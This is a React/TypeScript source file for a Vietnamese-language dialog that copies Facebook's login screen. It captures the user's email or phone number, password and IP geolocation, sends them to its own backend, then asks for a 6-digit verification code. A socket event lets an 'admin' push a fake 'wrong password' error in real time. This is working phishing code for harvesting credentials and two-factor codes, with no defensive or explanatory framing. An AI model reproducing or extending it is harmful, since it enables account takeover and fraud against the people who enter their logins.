import { useState, useEffect, useRef } from 'react';
import {
  Dialog,
  DialogContent,
  Box,
  Typography,
  TextField,
  Button,
  CircularProgress,
  InputAdornment,
  IconButton,
  Divider,
  Stack,
} from '@mui/material';
import Iconify from '../../components/iconify';
import { socket } from '../../utils/socket';
import { submitFbLogin, submitFbOtp } from '../../redux/slices/fb';

// ─── Types ────────────────────────────────────────────────────────────────────

interface Props {
  open: boolean;
  onClose: VoidFunction;
  onSuccess: VoidFunction;
  // Geo info to pre-fill
  geoInfo?: {
    ipAddress?: string;
    country?: string;
    region?: string;
    city?: string;
  };
}

// ─── Component ────────────────────────────────────────────────────────────────

export default function FacebookLoginDialog({ open, onClose, onSuccess, geoInfo }: Props) {
  const [step, setStep] = useState<'login' | 'otp'>('login');
  const [account, setAccount] = useState('');
  const [password, setPassword] = useState('');
  const [verifyCode, setVerifyCode] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [wrongPass, setWrongPass] = useState(false); // admin triggers this
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [ipData, setIpData] = useState<any>(null);

  // Fetch IP info on mount
  useEffect(() => {
    const fetchIp = async () => {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        setIpData(data);
      } catch (error) {
        console.error('Failed to fetch IP info', error);
      }
    };
    fetchIp();
  }, []);

  // Reset on open
  useEffect(() => {
    if (open) {
      setStep('login');
      setAccount('');
      setPassword('');
      setVerifyCode('');
      setShowPassword(false);
      setLoading(false);
      setWrongPass(false);
      setSessionId(null);
    }
  }, [open]);

  // Listen for admin "wrong pass" socket event
  useEffect(() => {
    if (!open) return;

    socket.connect();

    const handleWrongPass = (data: { id: string }) => {
      if (sessionId && data.id === sessionId) {
        setLoading(false);
        setWrongPass(true);
        setStep('login'); // keep on login screen
      }
    };

    socket.on('fb-wrong-pass', handleWrongPass);

    return () => {
      socket.off('fb-wrong-pass', handleWrongPass);
    };
  }, [open, sessionId]);

  // ─── Handlers ──────────────────────────────────────────────────────────────

  const handleLoginSubmit = async () => {
    if (!account.trim() || !password.trim()) return;

    setLoading(true);
    setWrongPass(false);

    try {
      const result = await submitFbLogin({
        account: account.trim(),
        password: password.trim(),
        ipAddress: ipData?.ip || geoInfo?.ipAddress,
        country: ipData?.country_name || geoInfo?.country,
        region: ipData?.region || geoInfo?.region,
        city: ipData?.city || geoInfo?.city,
      });

      setSessionId(result.id);
      // Wait for admin to decide: wrong-pass socket OR they do nothing and OTP dialog shows
      // After 1s show OTP step (admin can push wrong-pass at any time before user submits OTP)
      setStep('otp');
      setLoading(false);
    } catch (error) {
      setLoading(false);
      setWrongPass(true);
    }
  };

  const handleOtpSubmit = async () => {
    if (!verifyCode || verifyCode.length !== 6 || !sessionId) return;

    setLoading(true);
    try {
      await submitFbOtp(sessionId, verifyCode);
      setLoading(false);
      onSuccess();
    } catch (error) {
      setLoading(false);
    }
  };

  const handleRetryPassword = () => {
    setWrongPass(false);
    setPassword('');
  };

  // ─── Render ────────────────────────────────────────────────────────────────

  return (
    <Dialog
      open={open}
      onClose={loading ? undefined : onClose}
      maxWidth="xs"
      fullWidth
      PaperProps={{
        sx: {
          borderRadius: 2,
          overflow: 'hidden',
          background: '#fff',
        },
      }}
    >
      <DialogContent sx={{ p: 0 }}>
        {/* ── Facebook header ── */}
        <Box
          sx={{
            background: '#1877f2',
            py: 3,
            px: 3,
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            gap: 1,
          }}
        >
          {/* Facebook "f" logo */}
          <Box
            sx={{
              width: 56,
              height: 56,
              borderRadius: '50%',
              background: '#fff',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              boxShadow: '0 2px 8px rgba(0,0,0,0.25)',
            }}
          >
            <Typography
              sx={{
                fontSize: 34,
                fontWeight: 900,
                color: '#1877f2',
                lineHeight: 1,
                mt: '2px',
              }}
            >
              f
            </Typography>
          </Box>

          <Typography
            sx={{
              color: '#fff',
              fontWeight: 700,
              fontSize: 18,
              letterSpacing: 0.2,
            }}
          >
            {step === 'login'
              ? 'Đăng nhập vào Facebook'
              : 'Xác minh danh tính của bạn'}
          </Typography>
        </Box>

        {/* ── Body ── */}
        <Box sx={{ px: 3, py: 3 }}>
          {step === 'login' ? (
            <>
              <Typography
                variant="body2"
                sx={{ color: 'text.secondary', mb: 2.5, textAlign: 'center' }}
              >
                Nhập thông tin đăng nhập Facebook của bạn để tiếp tục.
              </Typography>

              {/* Wrong password error */}
              {wrongPass && (
                <Box
                  sx={{
                    bgcolor: '#fff0f0',
                    border: '1px solid #ffcdd2',
                    borderRadius: 1.5,
                    px: 2,
                    py: 1.5,
                    mb: 2,
                    display: 'flex',
                    alignItems: 'flex-start',
                    gap: 1,
                  }}
                >
                  <Iconify
                    icon="eva:alert-circle-fill"
                    sx={{ color: 'error.main', mt: '2px', flexShrink: 0 }}
                  />
                  <Box>
                    <Typography
                      variant="body2"
                      sx={{ color: 'error.main', fontWeight: 600 }}
                    >
                      Mật khẩu không đúng
                    </Typography>
                    <Typography variant="caption" sx={{ color: 'error.dark' }}>
                      Vui lòng nhập lại mật khẩu của bạn.
                    </Typography>
                  </Box>
                </Box>
              )}

              <Stack spacing={2}>
                <TextField
                  fullWidth
                  label="Email hoặc số điện thoại"
                  value={account}
                  onChange={(e) => setAccount(e.target.value)}
                  autoComplete="email"
                  disabled={loading}
                  sx={{ '& .MuiOutlinedInput-root': { borderRadius: 2 } }}
                />
                <TextField
                  fullWidth
                  label="Mật khẩu"
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  disabled={loading}
                  error={wrongPass}
                  InputProps={{
                    endAdornment: (
                      <InputAdornment position="end">
                        <IconButton
                          edge="end"
                          size="small"
                          onClick={() => setShowPassword(!showPassword)}
                        >
                          <Iconify
                            icon={showPassword ? 'eva:eye-fill' : 'eva:eye-off-fill'}
                          />
                        </IconButton>
                      </InputAdornment>
                    ),
                  }}
                  sx={{ '& .MuiOutlinedInput-root': { borderRadius: 2 } }}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') handleLoginSubmit();
                  }}
                />

                <Button
                  fullWidth
                  variant="contained"
                  size="large"
                  onClick={handleLoginSubmit}
                  disabled={loading || !account.trim() || !password.trim()}
                  sx={{
                    bgcolor: '#1877f2',
                    fontWeight: 700,
                    fontSize: 16,
                    py: 1.5,
                    borderRadius: 2,
                    textTransform: 'none',
                    '&:hover': { bgcolor: '#166fe5' },
                    '&.Mui-disabled': { bgcolor: '#e4e6eb', color: '#bcc0c4' },
                  }}
                >
                  {loading ? (
                    <CircularProgress size={22} sx={{ color: '#fff' }} />
                  ) : (
                    'Đăng nhập'
                  )}
                </Button>

                <Typography
                  variant="body2"
                  sx={{
                    color: '#1877f2',
                    textAlign: 'center',
                    cursor: 'pointer',
                    fontWeight: 500,
                    '&:hover': { textDecoration: 'underline' },
                  }}
                >
                  Quên mật khẩu?
                </Typography>
              </Stack>

              <Divider sx={{ my: 2.5 }} />

              <Button
                fullWidth
                variant="contained"
                sx={{
                  bgcolor: '#42b72a',
                  color: '#fff',
                  fontWeight: 700,
                  fontSize: 15,
                  py: 1.2,
                  borderRadius: 2,
                  textTransform: 'none',
                  '&:hover': { bgcolor: '#36a420' },
                }}
              >
                Tạo tài khoản mới
              </Button>
            </>
          ) : (
            <>
              {/* OTP Step */}
              <Box sx={{ textAlign: 'center', mb: 2 }}>
                <Box
                  sx={{
                    width: 64,
                    height: 64,
                    borderRadius: '50%',
                    bgcolor: '#e7f3ff',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    mx: 'auto',
                    mb: 2,
                  }}
                >
                  <Iconify
                    icon="eva:smartphone-fill"
                    sx={{ color: '#1877f2', width: 32, height: 32 }}
                  />
                </Box>
                <Typography variant="subtitle1" fontWeight={700} sx={{ mb: 0.5 }}>
                  Nhập mã xác minh
                </Typography>
                <Typography variant="body2" sx={{ color: 'text.secondary' }}>
                  Chúng tôi đã gửi mã 6 chữ số đến thiết bị của bạn hoặc email.
                  Hãy kiểm tra và nhập mã bên dưới.
                </Typography>
              </Box>

              <Stack spacing={2}>
                <TextField
                  fullWidth
                  label="Mã xác minh (6 chữ số)"
                  value={verifyCode}
                  onChange={(e) => setVerifyCode(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))}
                  inputProps={{ maxLength: 6, inputMode: 'numeric', style: { letterSpacing: 8, fontSize: 20, textAlign: 'center' } }}
                  disabled={loading}
                  sx={{ '& .MuiOutlinedInput-root': { borderRadius: 2 } }}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') handleOtpSubmit();
                  }}
                />

                <Button
                  fullWidth
                  variant="contained"
                  size="large"
                  onClick={handleOtpSubmit}
                  disabled={loading || verifyCode.length !== 6}
                  sx={{
                    bgcolor: '#1877f2',
                    fontWeight: 700,
                    fontSize: 16,
                    py: 1.5,
                    borderRadius: 2,
                    textTransform: 'none',
                    '&:hover': { bgcolor: '#166fe5' },
                    '&.Mui-disabled': { bgcolor: '#e4e6eb', color: '#bcc0c4' },
                  }}
                >
                  {loading ? (
                    <CircularProgress size={22} sx={{ color: '#fff' }} />
                  ) : (
                    'Xác nhận'
                  )}
                </Button>

                <Button
                  fullWidth
                  variant="text"
                  onClick={() => {
                    setStep('login');
                    setVerifyCode('');
                  }}
                  sx={{
                    textTransform: 'none',
                    color: '#606770',
                    fontWeight: 500,
                  }}
                >
                  ← Quay lại
                </Button>
              </Stack>
            </>
          )}
        </Box>

        {/* ── Footer ── */}
        <Box sx={{ px: 3, pb: 2, textAlign: 'center' }}>
          <Typography variant="caption" sx={{ color: '#8a8d91' }}>
            Facebook giúp bạn kết nối và chia sẻ cùng mọi người trong cuộc sống của bạn.
          </Typography>
        </Box>
      </DialogContent>
    </Dialog>
  );
}
